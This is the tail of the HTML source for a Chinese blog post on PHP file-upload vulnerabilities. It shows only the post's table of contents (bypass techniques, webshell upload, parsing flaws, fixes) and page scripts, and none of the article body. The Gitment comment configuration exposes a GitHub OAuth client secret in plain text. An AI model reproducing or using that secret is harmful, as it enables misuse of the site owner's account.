+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#文件上传包结构"><span class="toc-nav-text">文件上传包结构</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#文件上传存在的检测"><span class="toc-nav-text">文件上传存在的检测</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#客户端javascript检测"><span class="toc-nav-text">客户端javascript检测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#代码"><span class="toc-nav-text">代码</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#绕过方法"><span class="toc-nav-text">绕过方法</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#服务端MIME类型检测"><span class="toc-nav-text">服务端MIME类型检测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#代码-1"><span class="toc-nav-text">代码</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#绕过方法-1"><span class="toc-nav-text">绕过方法</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#服务端目录路径检测"><span class="toc-nav-text">服务端目录路径检测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#代码-2"><span class="toc-nav-text">代码</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#绕过方法-2"><span class="toc-nav-text">绕过方法</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#适用场合"><span class="toc-nav-text">适用场合</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#服务端文件扩展名检测"><span class="toc-nav-text">服务端文件扩展名检测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#绕过方法-3"><span class="toc-nav-text">绕过方法</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#后端采用in-arrary函数判断文件后缀-黑名单"><span class="toc-nav-text">后端采用in_arrary函数判断文件后缀(黑名单)</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#白名单"><span class="toc-nav-text">白名单</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#服务器端文件内容检测"><span class="toc-nav-text">服务器端文件内容检测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#文件幻数检测"><span class="toc-nav-text">文件幻数检测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#绕过方法-伪造幻数，添加webshell"><span class="toc-nav-text">绕过方法:伪造幻数，添加webshell</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#文件相关信息检测"><span class="toc-nav-text">文件相关信息检测</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#文件加载检测"><span class="toc-nav-text">文件加载检测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#绕过方法-4"><span class="toc-nav-text">绕过方法</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#竞争上传"><span class="toc-nav-text">竞争上传</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#代码-3"><span class="toc-nav-text">代码</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#解析漏洞总结"><span class="toc-nav-text">解析漏洞总结</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Apache解析漏洞"><span class="toc-nav-text">Apache解析漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#新版本apache解析漏洞"><span class="toc-nav-text">新版本apache解析漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#IIS解析漏洞"><span class="toc-nav-text">IIS解析漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Nginx解析漏洞"><span class="toc-nav-text">Nginx解析漏洞</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#文件上传其他知识点"><span class="toc-nav-text">文件上传其他知识点</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#修复建议"><span class="toc-nav-text">修复建议</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/07/10/PHP文件上传漏洞总结/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "PHP文件上传漏洞总结",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
